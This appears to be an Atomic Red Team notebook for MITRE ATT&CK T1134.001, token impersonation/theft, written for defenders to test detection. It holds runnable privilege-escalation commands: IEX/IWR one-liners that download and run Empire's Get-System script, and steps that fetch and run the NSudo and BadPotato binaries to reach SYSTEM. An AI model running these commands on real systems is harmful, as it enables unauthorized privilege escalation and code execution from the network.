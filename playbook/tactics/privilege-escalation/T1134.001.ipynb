{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "dca8f864",
   "metadata": {},
   "source": "# T1134.001 - Token Impersonation/Theft\nAdversaries may duplicate then impersonate another user's existing token to escalate privileges and bypass access controls. For example, an adversary can duplicate an existing token using `DuplicateToken` or `DuplicateTokenEx`. The token can then be used with `ImpersonateLoggedOnUser` to allow the calling thread to impersonate a logged on user's security context, or with `SetThreadToken` to assign the impersonated token to a thread.\n\nAn adversary may perform [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) when they have a specific, existing process they want to assign the duplicated token to. For example, this may be useful for when the target user has a non-network logon session on the system.\n\nWhen an adversary would instead use a duplicated token to create a new process rather than attaching to an existing process, they can additionally [Create Process with Token](https://attack.mitre.org/techniques/T1134/002) using `CreateProcessWithTokenW` or `CreateProcessAsUserW`. [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) is also distinct from [Make and Impersonate Token](https://attack.mitre.org/techniques/T1134/003) in that it refers to duplicating an existing token, rather than creating a new one."
  },
  {
   "cell_type": "markdown",
   "id": "709afd96",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "2db41921",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - Named pipe client impersonation",
    "Uses PowerShell and Empire's [GetSystem module](https://github.com/BC-SECURITY/Empire/blob/v3.4.0/data/module_source/privesc/Get-System.ps1). The script creates a named pipe, and a service that writes to that named pipe. When the service connects to the named pipe, the script impersonates its security context.\nWhen executed successfully, the test displays the domain and name of the account it's impersonating (local SYSTEM).\n\nReference: https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique NamedPipe -Verbose\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "bae3bec0",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1134.001 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "41ac5bde",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - `SeDebugPrivilege` token duplication",
    "Uses PowerShell and Empire's [GetSystem module](https://github.com/BC-SECURITY/Empire/blob/v3.4.0/data/module_source/privesc/Get-System.ps1). The script uses `SeDebugPrivilege` to obtain, duplicate and impersonate the token of a another process.\nWhen executed successfully, the test displays the domain and name of the account it's impersonating (local SYSTEM).",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique Token -Verbose\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9b42c7c2",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1134.001 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "0e849220",
   "metadata": {},
   "source": "### Atomic Test #3 - Launch NSudo Executable\nLaunches the NSudo executable for a short period of time and then exits.\nNSudo download observed after maldoc execution. NSudo is a system management tool for advanced users to launch programs with full privileges.\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: NSudoLG.exe must exist in the specified path #{nsudo_path}\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path \"PathToAtomicsFolder\\T1134.001\\bin\\NSudoLG.exe\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\NSudo_8.2_All_Components.zip\" \"https://github.com/M2Team/NSudo/releases/download/8.2/NSudo_8.2_All_Components.zip\"\nExpand-Archive -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\NSudo_8.2_All_Components.zip\" -DestinationPath \"PathToAtomicsFolder\\..\\ExternalPayloads\\NSudo_8.2_All_Components\" -Force\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\NSudo_8.2_All_Components\\NSudo Launcher\\x64\\NSudoLG.exe\" \"PathToAtomicsFolder\\T1134.001\\bin\\NSudoLG.exe\"\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\NSudo_8.2_All_Components.zip\" -Recurse -ErrorAction Ignore\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\NSudo_8.2_All_Components\" -Recurse -ErrorAction Ignore\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9841cfd3",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1134.001 -TestNumbers 3 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "51233982",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nStart-Process \"PathToAtomicsFolder\\T1134.001\\bin\\NSudoLG.exe\" -Argument \"-U:T -P:E cmd\"\nStart-Sleep -Second 5\nStop-Process -Name \"cmd\" -force -erroraction silentlycontinue\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "372a1c6d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1134.001 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "cb90521f",
   "metadata": {},
   "source": "### Atomic Test #4 - Bad Potato\nhttps://github.com/BeichenDream/BadPotato\nPrivilege escalation using named pipe connections\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: BadPotato.exe must exist in the temp directory\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\BadPotato.exe\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\BadPotato.exe\" \"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1134.001/bin/BadPotato.exe?raw=true\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c7028b80",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1134.001 -TestNumbers 4 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "f46404c5",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\ncd \"PathToAtomicsFolder\\..\\ExternalPayloads\"\nStart-Process .\\BadPotato.exe notepad.exe\nStart-Sleep -Second 20\nStop-Process -Name \"notepad\" -force -erroraction silentlycontinue\nStop-Process -Name \"BadPotato\" -force -erroraction silentlycontinue\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "84746066",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1134.001 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "67ac4c4b",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\ntaskkill /f /im notepad.exe\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3743a580",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1134.001 -TestNumbers 4 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "4a8219c1",
   "metadata": {},
   "source": "## Detection\nIf an adversary is using a standard command-line shell, analysts can detect token manipulation by auditing command-line activity. Specifically, analysts should look for use of the <code>runas</code> command. Detailed command-line logging is not enabled by default in Windows.(Citation: Microsoft Command-line Logging)\n\nAnalysts can also monitor for use of Windows APIs such as <code>DuplicateToken(Ex)</code>, <code> ImpersonateLoggedOnUser </code>, and <code> SetThreadToken </code> and correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators."
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}